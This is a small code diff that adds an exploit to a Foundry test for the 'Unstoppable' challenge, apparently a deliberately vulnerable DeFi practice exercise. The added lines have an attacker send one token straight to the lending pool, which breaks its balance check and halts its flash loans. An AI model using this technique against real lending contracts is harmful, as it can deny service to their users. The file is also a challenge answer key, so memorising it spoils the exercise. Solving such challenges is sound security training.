@@ -60,6 +60,13 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+
+        vm.startPrank(attacker);
+        // 1.hacker the balanceBefore -> need to transfer the damnValuableToken
+        // 2.Or hacker the poolBalance
+        dvt.transfer(address(unstoppableLender), 1);
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
